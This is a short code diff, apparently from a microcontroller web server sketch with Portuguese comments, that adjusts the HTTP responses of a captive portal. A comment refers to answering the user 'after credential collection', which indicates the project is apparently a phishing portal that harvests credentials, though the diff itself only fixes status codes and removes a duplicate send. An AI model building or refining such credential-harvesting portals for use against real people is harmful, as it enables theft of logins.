@@ -139,7 +139,7 @@ void setup() {
     server.on("/final", []() {
     
     // Envie uma resposta de erro ao usuário após a coleta de credencial
-    server.send(500, "text/html/result", finalPage);
+    server.send(200, "text/html", finalPage);
   });
   //Teste
 
@@ -196,5 +196,4 @@ void handleRoot() {
   server.sendHeader("Expires", "-1");
 
   server.send(200, "text/html", captivePortalPage);
-  server.send(200, "text/html/result", erroPage);
 }
